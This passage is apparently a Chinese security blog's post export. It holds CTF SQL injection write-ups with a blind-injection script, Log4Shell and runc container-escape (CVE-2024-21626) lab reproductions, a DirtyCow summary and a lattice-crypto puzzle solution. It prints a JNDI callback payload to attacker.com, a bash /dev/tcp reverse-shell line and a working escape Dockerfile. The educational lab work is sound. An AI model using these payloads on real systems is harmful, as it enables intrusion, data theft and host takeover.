?52725 +++ exited with 0 +++ 显然因为函数 procselfmemThread 要执行 lseek 和 write，而 madviseThread 只需要执行 madvise，所以 procselfmemThread 的执行时间会比 madviseThread 长很多，到后面很大一部分时间都是 procselfmemThread 在自己玩。 现在我们从整体分析一轮 PoC 干了什么： 打开文件 foo，并且用 mmap 映射到内存中，使用 MAP_PRIVATE 选项，表示这个映射是私有的，注意这个标志产生的效果是：对内存的修改不会影响到原文件，且通过 COW 机制创建一个私有副本。 启动线程 procselfmemThread，它会打开 /proc/self/mem，并且循环执行 lseek 和 write 操作，试图将 m00000000000000000 写入进去 启动线程 madviseThread，它会循环执行 madvise 操作，试图忽悠内核，让内核丢掉进程的私有页，也就是 foo 的私有副本，这样就会导致内核在执行 write 时，发现 foo 的私有副本已经不存在了，于是就会直接将数据写入到原文件 foo 中，而不是私有副本中。 当然以上仅仅是非常简单的原理概述，具体的细节需要详细了解相关的代码和标志位的含义。 总结有种把最近学的都串起来的爽感，包括 COW、条件竞争这些。当然也有没有深入学习 pwn 的遗憾，看起来 kernel 可玩的东西还是挺多的，这才是真正的登堂入室。 参考CVE-2016-5195经典内核漏洞复现之 dirtycowLinux Jargon Buster: What is Grub in Linux? What is it Used for?条件竞争学习 之 DirtyCow分析","link":"/2025/04/14/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%20CVE-2016-5195/"},{"title":"浅谈 SQL 注入","text":"一边瞎扯一边学习，也是很爽的。 前言我很早就接触过 MySQL，高考完暑假的时候就用 PHP 和 MySQL 搞了个简单的成绩查询系统，当时还不知道有 SQL 注入这个东西，回想起来要是漏给一个会 SQL 注入的人，估计就被打烂了。 但是为什么一直没怎么学 SQL 注入呢？—— 因为后来听说参数化查询基本可以完全防住 SQL 注入了，就感觉学这个没什么意义了。 现在转念一想，咱又不是搞前沿的，用这个打打老系统绰绰有余（关键是面试官真的会问），那就学一下咯。 小 Review: 发现之前写的 BUUOJ 有几题 SQL 注入的题目，挖了坑没补过程，准备学完补上。 参数化查询是如何防御 SQL 注入的可以看下知乎的这个回答，大概意思如下： 有一个 SQL 语句： 1select count(1) from students where name='张三' 注入语句： 1select count(1) from students where name='张三' or 1=1 那么 name 参数的值 张三' or 1=1 就会被当成 SQL 语句的一部分，整个一块编译，导致 SQL 注入。 这时候预编译来了，以下是一个 Java 的实现： 1234567import java.sql.PreparedStatement;String sql = &quot;select * from user where username=? and passwd=?&quot;;ps = conn.PreparedStatement(sql);ps.setString(1, &quot;admin&quot;);ps.setString(2, &quot;123456&quot;);resultSet = ps.executeQuery(); 可以看到，conn.PreparedStatement() 函数直接把 SQL 语句编译好了，后面只是传参 + 执行。可能读者咋一眼看上去会觉得没什么区别，我拿大家都熟悉的场景来举个例子：相信大家都是接触过 C 语言的，没有预编译的 SQL 就相当于你可以操作 *.c 文件给编译器编译并执行，可以把 int a=?; 填成 int a=1; system(&quot;rm -rf /&quot;);，而预编译的 SQL 就相当于编译了一段 int a=0;scanf(&quot;%d&quot;, &amp;a);，现在程序只负责接收参数并执行，根本无法编译恶意代码。 CTFshow 刷题记录web171 - web175给 Xenny 充点钱，在 NSS 上吸收了一下知识，读者如果像我一样也是个小白也可以去支持一下，十来块钱不算贵。以 CTFshow 的 web171 为例，查询语句题目直接给出（不会有人不知道 PHP 能用 . 拼接字符串吧） 1$sql = &quot;select username,password from user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; 那我们直接 '--+ 闭合即可。（-- 是注释符号，+ 是干嘛的我也不清楚，加就是了，# 也是注释符号，可以根据情况来），引号闭合的意义就是补全前面代码，使得前面部分加上这个引号是一个正常的语句，注释的意义是无视后面的代码，那么这时中间就可以写我们的 SQL 语句了。 1' order by 3--+ 换成 4 就报错，说明列数为 3那么采用联注，语句如下： 1' union select database(),version(),user()--+ 结果分别为 ctfshow_web, 10.3.18-MariaDB, root@localhost查表： 1' union select 1,2,table_name from information_schema.tables where table_schema='ctfshow_web'--+ 结果为 ctfshow_user再查列： 1' union select 1,2,column_name from information_schema.columns where table_name='ctfshow_user'--+ 结果为分别为 id, username, password最后直接套出整个表，当然根据题意加个 where username = 'flag' 也行： 1' union select id,username,password from ctfshow_user--+ web172 也是类似，虽然加了个如下拦截，但是我们不出现 username 字段即可 1234//检查结果是否有flag if($row-&gt;username!=='flag'){ $ret['msg']='查询成功'; } 还是仿照上面一套打下来，最终 payload 如下： 1' union select id,password from ctfshow_user2 where username='flag'--+ web173 的拦截比较有意思，直接正则匹配结果了，考虑能不能用 substr() 之类的函数截取字符串 1234//检查结果是否有flag if(!preg_match('/flag/i', json_encode($ret))){ $ret['msg']='查询成功'; } 发现他的 flag 头是 ctfshow{，根本不用管，绷，payload 如下： 1' union select id,1,password from ctfshow_user3--+ web174 有点刁难了，把数字也拦截了 1234//检查结果是否有flag if(!preg_match('/flag|[0-9]/i', json_encode($ret))){ $ret['msg']='查询成功'; } 考虑布尔盲注，payload 如下： 11' and 1=1--+ 发现此时有返回结果而改为 1=0 时返回的结果为空，说明布尔盲注可行，脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940import requests as rimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)value = ''i = 1while True: low, high = 0, 127 char_ascii = 0 while low &lt;= high: mid = (low + high) // 2 # payload = f&quot;1' and 1=if(ascii(substr((database()), {i}, 1)) &gt; {mid}, 1, 0)--+&quot; payload = f&quot;1' and 1=if(ascii(substr((select group_concat(password) from ctfshow_user4 where username='flag'), {i}, 1)) &gt; {mid}, 1, 0)--+&quot; payload = payload.replace(' ', '%20') payload = payload.replace(&quot;'&quot;, &quot;%27&quot;) # print(payload) result = r.get(f'https://777fe6df-5d10-4f76-81f6-91f860d5de1e.challenge.ctf.show/api/v4.php?id={payload}&amp;Page=1&amp;limit=10', verify=False) oracle = len(result.json()['data']) &gt; 0 if oracle: # 条件成立，ASCII值大于mid low = mid + 1 else: high = mid - 1 if high &lt; 0: # 字符位置不存在时退出 break char_ascii = high + 1 if char_ascii == 0: break value += chr(char_ascii) print(f&quot;Current: {value}&quot;) i += 1print(f&quot;Final value: {value}&quot;) 注意到 python 用 https 时需要加上 verify=False，否则会报错，还要加上 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 来禁止警告。Python 的 requests 还有个坑就是会把 params 猛猛地 urlencode 一遍，导致最终的 url 面目全非，从而导致 payload 不生效。 web175 拦截更离谱了，直接啥都拦了 1234//检查结果是否有flag if(!preg_match('/[\\x00-\\x7f]/i', json_encode($ret))){ $ret['msg']='查询成功'; } 我倒是想知道生产环境会不会有这么拦的 那从解题的角度来说那只能时间盲注了，payload 如下： 11' and 1=if(ascii(substr((select group_concat(password) from ctfshow_user5 where username='flag'), {i}, 1)) &gt; {mid}, sleep(1), 0)--+ oracle 改为 result.elapsed.total_seconds() &gt; 1 即可。 // To be continued… 参考https://www.zhihu.com/question/52869762https://www.freebuf.com/articles/web/339118.html","link":"/2025/03/29/%E6%B5%85%E8%B0%88%20SQL%20%E6%B3%A8%E5%85%A5/"},{"title":"漏洞分析之 CVE-2021-44228","text":"Log4j2 核弹级漏洞，时隔四年的复现。 前言当时这个漏洞出来的时候各种公众号关于这个的稿子满天飞，但是一直是个守法好公民，也没想着拿去梭两把。 虽然现在对 Java 不怎么熟悉，但是还是想挑战下自己，觉得会挺有意思的。 前置知识Log4j2 的日志记录功能第一次看到 Log4j 可能会有点奇怪 —— 怎么叫这名但是如果说这个是 Log for Java 的谐音的话，那一切就合理了Log4j2 也不难理解，就是 Log4j 的第二个版本，就跟 python2 和 python3 一样，最早其实也是有 python 1.x 版本的，但是 python2 从 2000 年就开始推行，所以没人认识 python1.x 而已。 Lookup 功能的设计缺陷Log4j2 支持一种名为 Lookup 的功能，允许在日志中插入动态内容，比如环境变量、系统信息等。其语法为 ${...}，例如 ${java:version} 会被替换为当前 Java 版本，听起来有点 SSTI 那味了。 JNDIJNDI，全称 Java Naming and Directory Interface，Java 命名和目录接口，是 Java 提供的一种 API，用于访问命名和目录服务。没接触过的读者看到这行字可能会心想：叽里咕噜说什么呢但是问题不大，我也没看懂。我们只需要大概理解成给他一个名字，他就能找到你想要的东西就行了，类似 Python 里的字典。 LDAPLDAP，全称 Lightweight Directory Access Protocol，轻量级目录访问协议，是一种用于访问和维护分布式目录信息服务的协议。如果这个也不看懂，那也没关系，同样类比 HTTP 协议就行了。 原理假设有一个 Java 网站的登录接口记录用输入的用户名，大概意思是这样，代码不一定对： 1logger.error(&quot;登录失败，用户名：&quot; + username); 若攻击者提交的用户名为 ${jndi:ldap://attacker.com/Exploit}，那么 Log4j2 会解析 ${jndi:...}，向 attacker.com 发起 LDAP 请求。 LDAP 服务器返回一个指向 http://attacker.com/Exploit.class 的地址。 Java 应用下载并执行 Exploit.class 中的恶意代码。 复现受影响的版本 Apache Log4j 2.x &lt;= 2.14.1使用 vulhub 的 docker 镜像，位于 /log4j/CVE-2021-44228 1docker-compose up -d 启动一下（每日热知识：-d 是 --detach 的缩写，表示在后台运行容器） 试了好久那个 dnslog 都不行，感觉是网络问题，因为我本地访问也是时灵时不灵 不管那么多了，直接上 exploit但是试了好久也不太行，看日志发现貌似是网络问题，于是把靶机和 Java Chains 塞一块，docker-compose 配置如下： 12345678910111213141516171819202122version: '2'services: solr: image: vulhub/solr:8.11.0 ports: - &quot;8983:8983&quot; - &quot;5005:5005&quot; java-chains: image: javachains/javachains:latest ports: - &quot;8011:8011&quot; - &quot;58080:58080&quot; - &quot;50389:50389&quot; - &quot;50388:50388&quot; - &quot;3308:3308&quot; - &quot;13999:13999&quot; - &quot;50000:50000&quot; - &quot;11527:11527&quot; environment: - CHAINS_AUTH=true - CHAINS_PASS= restart: always 依着 vulhub 自带的教程做，但是有个比较关键的点，那就是在 JDNI Control 面板把 IP 调成 Java Chains 的 IP，因为受害机要通过这个 IP 反连过来下载恶意代码（上文已经提过），此事在Java Chains 文档中亦有记载。 经测试 touch /tmp/success 成功，具体的反弹 shell 就不作测试了，贴个简单的反弹 shell 命令： 1bash -i &gt;&amp; /dev/tcp/attacker_ip/port 0&gt;&amp;1 // To be continued… 参考log4j2漏洞CVE-2021-44228复现笔记(纯步骤过程，没有复杂的知识点)跟个风，聊一聊这两天很火的Log4j核弹级漏洞","link":"/2025/04/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%20CVE-2021-44228/"},{"title":"漏洞分析之 CVE-2024-21626","text":"研究一下 Docker 的 CVE。 前置知识什么是 Docker相信读这篇文章的大部分人都知道 Docker 是什么，但不一定能背出这种八股问题。Deepseek 给出的回答是：Docker 是一种开源的容器化平台，用于快速构建、打包、部署和运行应用程序。它的核心思想是通过容器技术，将应用及其依赖环境（如库、配置等）打包成一个轻量级、可移植的镜像，从而实现 “一次构建，处处运行”。 什么是 runCrunC 是一个开源的容器运行时，是 Docker 的一部分，用于创建和运行容器。runC 是一个轻量级的工具，它实现了 OCI 标准，可以在任何 OCI 兼容的容器运行时中使用。 复现用 WSL 一直复现不出来，WSL 的情况很奇怪，docker version 能看到 runc 版本是老的，但是直接执行 runc 又没有这条命令。尝试了很多次实在不行了，换 VMWare 里搞搞新建了个 Ubuntu 20.04 的虚拟机，选择 Minimal Installation，不要浏览器之类乱七八糟的东西。学校内网有镜像站，直接换个源起飞。 12sudo rm /etc/apt/sources.list # 要备份就 mv 一下，因为我是新机，就直接删了sudo nano /etc/apt/sources.list 粘贴后 Ctrl + O 保存，Ctrl + X 退出。 12sudo apt updatesudo apt upgrade 这里默认没带 SSH，执行 sudo apt install openssh-server 装一下，不然不太习惯 Ubuntu 自带的终端。然后安装 Docker： 1sudo apt install docker.io docker version 看一下版本，runc 是新的，还是得自己编译老版本替换。 12345678git clone https://github.com/opencontainers/runccd runcgit checkout v1.1.0-rc.1sudo apt install -y build-essential libseccomp-dev # 不然会报错makesudo rm -rf $(which runc)sudo make installsudo systemctl restart docker 这个新机 make 和 go 都没有，中途也装了一下，不提。写一个 Dockerfile 如下： 1234FROM ubuntu # Sets the current working directory for this imageWORKDIR /proc/self/fd/7/ 执行 docker build . -t test，这里 -t 的意思是 tag。再执行 docker run --rm -it test bash，这里 --rm 可以让容器停止后自动删除容器文件系统，避免手动清理临时容器，一般用于测试，-it bash 意思是起一个交互式的 bash shell。说是可能要多执行几次才会成功，但是执行了几十次都不行，把 Dockerfile 的 WORKDIR 改成 WORKDIR /proc/self/fd/8/ 就可以了。 OHHHHHHHHH!!!!!!!!!以下是命令执行记录： 1234567891011121314151617181920212223242526272829303132333435kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test bashshell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directoryroot@6e9ec0c97b8f:.# cd ../..chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directoryroot@6e9ec0c97b8f:../..# lsblock bus class dev devices firmware fs hypervisor kernel module powerroot@6e9ec0c97b8f:../..# pwd../..root@6e9ec0c97b8f:../..# cd ..root@6e9ec0c97b8f:../../..# ls /bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr varroot@6e9ec0c97b8f:../../..# ls /homeubunturoot@6e9ec0c97b8f:../../..# docker psbash: docker: command not foundroot@6e9ec0c97b8f:../../..# chroot .# lsbin cdrom etc lib lib64 lost+found mnt proc run snap swapfile tmp varboot dev home lib32 libx32 media opt root sbin srv sys usr# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES6e9ec0c97b8f test &quot;bash&quot; 4 minutes ago Up 4 minutes admiring_gates# whoamiroot# exitroot@6e9ec0c97b8f:../../..# exitexitkali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test[sudo] password for kali:shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directoryroot@21b173949eee:.# exitexitkali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test bashshell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directoryroot@d5e014a9425b:.# 这里简单提下，chroot 是改变根目录的命令，chroot . 就是把当前目录作为根目录，这样操作起来就跟宿主机一样了。 原理还是得先普及几个概念。 什么是 openat()这是 DeepSeek 的回答： openat() 是 Linux 系统中的一个系统调用，用于以相对路径的方式打开文件或目录，旨在解决传统 open() 函数在多线程或路径变化场景下的竞争条件问题。 首先我们知道 open() 是一个关于文件的系统调用，那么就可以大概理解成 openat() 是 open() 的一个改良。 关于 open() 函数的条件竞争问题这个属于题外话，感兴趣的朋友可以看一下，不感兴趣的直接往下过就行。条件竞争有些情景也叫竞态条件，可以大致理解成一回事。我们可以用一个简单的例子来说明这个问题，先在 /tmp/dir1 和 /tmp/dir2 下分别创建一个文件 test.txt，命令如下： 123mkdir -p /tmp/dir1 /tmp/dir2 &amp;&amp; \\echo &quot;This is /tmp/dir1/test.txt&quot; &gt; /tmp/dir1/test.txt &amp;&amp; \\echo &quot;This is /tmp/dir2/test.txt&quot; &gt; /tmp/dir2/test.txt 然后写一个简单的 C 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;const char *filename = &quot;test.txt&quot;;// 线程 A：循环切换当前工作目录void *switch_directory(void *arg) { while (1) { // 在三个目录之间来回切换 chdir(&quot;/tmp/dir1&quot;); chdir(&quot;/tmp/dir2&quot;); chdir(&quot;/var&quot;); } return NULL;}// 线程 B：尝试打开文件void *open_file(void *arg) { while (1) { // 尝试以只读方式打开文件（假设文件存在于某目录下） int fd = open(filename, O_RDONLY); if (fd == -1) { perror(&quot;open failed&quot;); } else { printf(&quot;open succeeded\\n&quot;); // 输出文件内容 char buf[1024]; ssize_t n = read(fd, buf, sizeof(buf)); if (n == -1) { perror(&quot;read failed&quot;); } else { buf[n] = '\\0'; printf(&quot;read: %s\\n&quot;, buf); } close(fd); } usleep(1000000); // 短暂延迟 } return NULL;}int main() { pthread_t t1, t2; pthread_create(&amp;t1, NULL, switch_directory, NULL); pthread_create(&amp;t2, NULL, open_file, NULL); pthread_join(t1, NULL); pthread_join(t2, NULL); return 0;} 编译并运行这个程序： 1gcc -o race_condition_test race_condition_test.c -lpthread &amp;&amp; ./race_condition_test 可以看到执行结果如下： 12345678910111213141516171819202122open succeededread: This is /tmp/dir2/test.txtopen failed: No such file or directoryopen failed: No such file or directoryopen succeededread: This is /tmp/dir2/test.txtopen succeededread: This is /tmp/dir2/test.txtopen failed: No such file or directoryopen succeededread: This is /tmp/dir1/test.txtopen succeededread: This is /tmp/dir1/test.txtopen succeededread: This is /tmp/dir2/test.txtopen failed: No such file or directory 读者稍加理解上以代码和运行结果就可以发现，open() 函数容易受到 CWD（Current Working Directory，当前工作目录）的影响，若多个线程同时调用 chdir() 修改全局 CWD，并依赖相对路径调用 open()，其他线程的后续 open() 操作就可能因 CWD 被意外修改而解析到错误路径。 这个时候 openat() 就来了，man 官网上关于 open 家族的函数的描述如下： 12345678910111213#include &lt;fcntl.h&gt;int open(const char *pathname, int flags, ... /* mode_t mode */ );int creat(const char *pathname, mode_t mode);int openat(int dirfd, const char *pathname, int flags, ... /* mode_t mode */ );/* Documented separately, in openat2(2): */int openat2(int dirfd, const char *pathname, const struct open_how *how, size_t size); 可以看到，openat() 函数比 open() 多了一个 dirfd 参数，这个参数是一个文件描述符，用于指定相对路径的起始目录，而不是依赖全局 CWD，这样就避免的 open() 函数的条件竞争问题。demo 如下： 12int dirfd = open(&quot;/home&quot;, O_RDONLY | O_DIRECTORY);int fd = openat(dirfd, filename, O_RDONLY); 具体的对比测试就不做了，反正肯定可以解决上面的问题的（不然搞来干嘛 hhh openat() | openat(2) | openat2() | openat2(2) 的区别在搜索的过程中，这几个玩意都有出现，给我绕晕了。 吐槽一下，nitroc 的文章里面一会 openat(2) 一会 openat2(2) 的，一切换成他的英文版本又全是 openat2(2)，不是哥们你能不能好好写文章，有点逆天了。 这块问了下 DeepSeek，然后自己试了一下，大概得出的结论如下：先说 openat() 和 openat2()，首先上面的文档比较明显地看到 openat() 和 openat2() 在参数上的区别，openat() 采用的还是传统的 flags，而 openat2() 采用的是 struct open_how 结构体，可以说 openat2() 是 openat() 的一个扩展，具体不作展开，读者有兴趣可以自行查阅相关文档。 那 openat(2) 和 openat2(2) 又是什么呢？经过我的测试，结论有点无语，这个 2指的是 Linux 手册页第 2 部分，执行命令 man 2 openat 可以在本地看到相关文档，翻到最后，有个 1234SEE ALSO chmod(2), chown(2), close(2), dup(2), fcntl(2), link(2), lseek(2), mknod(2), mmap(2), mount(2), open_by_handle_at(2), ope‐ nat2(2), read(2), socket(2), stat(2), umask(2), unlink(2), write(2), fopen(3), acl(5), fifo(7), inode(7), path_resolution(7), symlink(7) 不信邪的读者可以执行 man 7 fifo，就能看到相关文档，但是执行 man 2 fifo，即在第 7 部分以外的地方查找，就会提示 No manual entry for fifo in section 2，其他命令类似。 什么是 Cgroups以下是 DeepSeek 的回答：Cgroups（Control Groups） 是 Linux 内核提供的一种机制，用于对系统资源（如 CPU、内存、磁盘 I/O、网络等）进行分组管理和限制。它通过将进程及其子进程组织成层级化的“控制组”，实现对不同进程组的资源分配、优先级调整和监控。 那么说人话就是，Cgroups 是用来调控资源的使用的。Docker 通过 Namespace 实现了容器的隔离，通过 Cgroups 实现了容器的资源限制，太有意思了。 Docker 运行流程12345678910111213用户操作层 ├── docker-client (CLI) └── dockerd (守护进程) │容器管理层 └── containerd │容器运行时层 ├── containerd-shim (管理单个容器) └── runc (实际创建容器) │容器内部 └── container-entrypoint (容器入口命令) 现在我们可以系统地观察一下 Docker 启用一个容器的流程了，再补充一个热知识：dockerd 后面的 d 指的是 daemon，守护进程的意思，containerd 后面的 d 同理，sshd 等平时应该也见过。containerd-shim 则是 containerd 的一个子进程，负责管理单个容器的生命周期，与容器是一一对应的关系。从 shim 的英文意思（垫片）可以看出，是一个连接 containerd 和 runc 的桥梁，避免单个容器的异常影响整个 containerd 的运行。 为什么会产生这个漏洞观察 Cgroups 关于这个漏洞的修复https://github.com/opencontainers/cgroups/commit/8f731c2c1785c565ac665fcc309e87b31305bea2可以很明显地发现关于 openat2() 的调用产生如下变化： 12- Flags: unix.O_DIRECTORY | unix.O_PATH,+ Flags: unix.O_DIRECTORY | unix.O_PATH | unix.O_CLOEXEC, 可以看到之前是不带 O_CLOEXEC 的，O_CLOEXEC 是一个标志位，全称 Close-on-Exec，核心作用是在进程调用 exec 系列函数（如 execve）执行新程序时，自动关闭当前打开的文件描述符，从而避免子进程继承不必要的资源。 prepareOpenat2() 函数会测试一下 openat2() 能不能用，因为 openat2() 是 Linux 5.6 版本才有的，但是由于没加 O_CLOEXEC，这个测试不会把打开过的主机 /sys/fs/cgroup 的 fd 关掉，以至于子进程仍然可以访问这个 fd，最终导致逃逸的发生。 那为什么 /sys/fs/cgroup 的文件描述符是 8 呢，根据文章的说法，这个与 Golang 运行时有关系，我们知道 0 是 stdin，1 是 stdout，2 是 stderr，然后一些日志啥的会用到 fd，排队排到 /sys/fs/cgroup 的时候就变成 8 了。 总结算是比较系统地了解了一下 Docker，复现 CVE 真的能学到东西的。 参考https://nitroc.org/posts/cve-2024-21626-illustratedhttps://www.manjusaka.blog/posts/2024/02/10/CVE-2024-21626/index.htmlhttps://blog.csdn.net/qq_42931917/article/details/131468557https://man7.org/linux/man-pages/man2/open.2.htmlhttps://github.com/opencontainers/cgroups/blob/2a61babab3b079d757796fb543bf91400d15d4b9/file.go#L110","link":"/2025/03/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%20CVE-2024-21626/"},{"title":"灯，等灯等灯","text":"线性同余方程组与格基约化问题 前言 没有听到吗？在耳边回荡着的钟声。 传闻中，远古文明能够捕猎闪电，将其封印在蜿蜒曲折的法阵中，用以驱动炼金术的最高成就——机械之心。 而在诸多机械之心的流派里，蔚蓝是曾经的王者。无信者窃取神明的奇迹，沉湎于蔚蓝创造出来的虚幻之间，得以逃避残酷的现实。 只是，火已渐熄，位不见王影。那一抹纯净的蔚蓝也逐渐染上铜锈和铁锈的颜色。破落的圣殿中只剩无名的巡礼者，还在追寻当年先知摩尔留下的足迹。 此时才明白，那则预言的含义：火焰熄灭之时，钟声响起，余灰纷沓而来，解开沉寂千年的机关，点亮传承的图腾。无火的余灰不能成为柴薪，可也许正因这样，才会如此向往光明吧。 还没有听到吗？那回荡在耳边的，古老而熟悉的，钟声—— 灯，等灯等灯 以上是 Hackergame 2021 的一道点灯题的题文。 解这题的时候连线代都不会，拿到神的题解也跑不起来，后来才知道 Sagemath 要另行安装， pip install sage 是无用的。前些天在单人豪华房里坐了几天牢，趁机也入门了一下格密码，隐约联想到这道题有点类似 CVP 的感觉，而再回头看神的题解果真也是这个思路，如今便借着学习一下 Python 和格。考虑到读者水平可能与我相近，故以下的分析我尽可能做到详细，几乎每一步都有分析，相应的，文章篇幅也会比较长。如果能认真读完并理解，相信会有不小的收获。 题目链接http://202.38.93.111:12768/login?token=1:MEQCIBY0ubN3BOXYsuRdXzqWIWNf8Jx0Y6giZCSp/Rg8zdNwAiBMZGWaiIGLD33KTfQ5TTLejp9PwGp8Gg4HsJbdo8sVig==如果还没关的话应该能打开（） 好吧已经 Hackergame 2022 了，关了。 灯 by mcfx详解注：此题共 3 关，为 Level0 、 Level1 及 Level2 ，由于 Level1 综合了三关的解法，故以下均以 Level1 为例。 准备数据及函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from sage.all import *import sys, requeststarget = [ [189, 189, 189, 189, 189, 33, 33, 33, 189, 189, 189, 189], [189, 189, 189, 33, 33, 33, 189, 33, 44, 189, 189, 189], [189, 189, 189, 189, 189, 33, 33, 33, 33, 189, 189, 189], [189, 189, 189, 189, 189, 33, 189, 33, 33, 189, 189, 189], [189, 189, 189, 33, 33, 189, 189, 33, 33, 33, 189, 189], [189, 134, 33, 33, 189, 189, 189, 189, 33, 33, 189, 189], [189, 144, 33, 33, 189, 189, 189, 189, 33, 189, 189, 189], [189, 142, 33, 33, 189, 189, 189, 189, 33, 33, 33, 189], [189, 100, 142, 33, 189, 189, 189, 189, 33, 33, 33, 189], [189, 142, 142, 189, 189, 189, 189, 189, 189, 33, 189, 189], [189, 59, 142, 33, 189, 189, 189, 189, 33, 189, 189, 189], [189, 189, 33, 33, 189, 189, 189, 189, 189, 189, 189, 189],]def level01_val(i, j, x, y): if (x == i or y == j): return 3 - (abs(x - i) + abs(y - j)) return 0def level2_val(i, j, x, y): return [31, 63, 127][max(abs(x - i), abs(y - j))]levels = [ (level01_val, '''................................................................................................................................................'''), (level01_val, '''..........................X.X.........XXX.........X.X..........................XXX.........X...........X.X.........XXX..........................'''), (level2_val, '''..........................X.X...XX....X.X...X.....XXX..XX.............................XXX..XXX.....X...X.......X...XXX..........................''')]def id(x, y): return x * 12 + ylevel_id = int(sys.argv[1])ban = list(map(lambda x: [y == 'X'for y in x], levels[level_id][1].split())) from sage.all import *首先要安装 Sagemath，因为 Sagemath 在 Windows 下运行也是要虚拟出一个 Unix 环境，故建议在 WSL 里 sudo apt install sagemath ，可能中途要 apt-get upgrade 。 sys.argv[1]argv[0] 是脚本名称（它是否为完整路径名取决于操作系统）。则 argv[1] 为省去后缀名的文件名，如 Level0 时为脚本名为 0.py ， argv[1] 为 0 。 ban = list(map(lambda x: [y == 'X'for y in x], levels[level_id][1].split()))lambda 是 Python 的一个关键字，可以用来定义匿名函数。所谓匿名函数，就是没有名字的函数，与命名函数类似，都有参数和返回值，只是没有名字。如 add=lambda x, y: x+y 这个函数就将传入的两个参数相加，返回结果，即 add(1, 2) 等于 1+2 ； map(lambda x: x+1, [1, 2, 3]) 将列表 [1, 2, 3] 中的元素分别加 1 ，其结果 [2, 3, 4] 。这里 map(lambda x: [y == 'X'for y in x], levels[level_id][1].split()) 一句是将上面定义的 12 阶方阵中 X 转为 True ， . 转为 False ，然后放入一个列表 ban 中，此时 ban 为两级列表。 准备矩阵系数 12345678910111213m = []free = []for i in range(12): for j in range(12): if ban[i][j]: continue free.append((i, j)) t = [0] * 144 for x in range(i - 2, i + 3): for y in range(j - 2, j + 3): if (0 &lt;= x &lt; 12) and (0 &lt;= y &lt; 12): t[id(x, y)] = levels[level_id][0](i, j, x, y) m.append(t + [0]) levels[level_id][0](i, j, x, y)这里是在元组里放函数，注意到上面的 Levels=[(levev01_val, '''...'''),(...),(...)] ，所以 levels[level_id][0] 是 levev01_val 函数。这样的用法如： 1234def add(x,y):return x+ytup=(add,1,2)print(tup[0](tup[1],tup[2]))# 3 list也可以实现类似操作，Python确实花.jpg。 不难发现， free[] 里放的是可以点的坐标，如 $(0,0),(0,1)…$ 注意到， level01_val 函数在上面已经定义： 1234def level01_val(i, j, x, y):if (x == i or y == j): return 3 - (abs(x - i) + abs(y - j))return 0 这个函数的参数中 i,j 为操作的点(即按下的点)坐标， x,y 为受影响的点坐标，返回值为受影响坐标的增量。 如 (i,j) 为 $(2,3)$ 时，若 x,y 为 $(2,3)$ ，则根据规则，返回值为 3 ，若 x,y 为 $(2,4)$ ，则返回值为 2 ，若 x,y 为 $(3,3)$ ，则返回值为 2 ，若 x,y 为 $(3,4)$ ，则返回值为 0 。如下表： x\\y\\返回值 2 3 4 1 0 2 0 2 2 3 2 3 0 2 0 12345for x in range(i - 2, i + 3): for y in range(j - 2, j + 3): if (0 &lt;= x &lt; 12) and (0 &lt;= y &lt; 12): t[id(x, y)] = levels[level_id][0](i, j, x, y)m.append(t + [0]) 上面已经定义函数 def id(x, y): return x * 12 + y ，即 id 函数把给定的坐标转为方阵一维展开后的位置，则此处把每个操作点对整个方阵 144 个位置影响(增量)后面补一个 0 （下面会解释为什么加一个 0 ）放入 t[] 中，此时t可以看作一个向量。 每个 t[] 补入 m[] 后，此时 $m$ 是一个 (144-16)x(144+1) 即 128x145 的矩阵，且第 145 列全为 0 ( 16 为 X 即不可操作点的数量)，如下： $$ m=\\begin{pmatrix} 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\ 2 &amp; 3 &amp; 2 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 \\\\ 1 &amp; 2 &amp; 3 &amp; 2 &amp; 1 &amp; \\cdots &amp; 0 \\\\ 0 &amp; 1 &amp; 2 &amp; 3 &amp; 2 &amp; \\cdots &amp; 0 \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\end{pmatrix} $$ 注意：上面打省略号的地方不全为0！ 比如第一行是由如下一个 12x12 的矩阵展开为一维形式： $$ \\begin{pmatrix} 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\ 2 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\ 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\end{pmatrix} $$ 123456789for i in range(144): m.append([(i == j) * 256 for j in range(144)] + [0])t = []for i in range(12): for j in range(12): t.append(target[i][j])C = 256m.append([-x for x in t] + [C]) 不难看出，此时的 $m$ 为如下形式： $$ m=\\begin{pmatrix} 3 &amp; 2 &amp; 1 &amp; 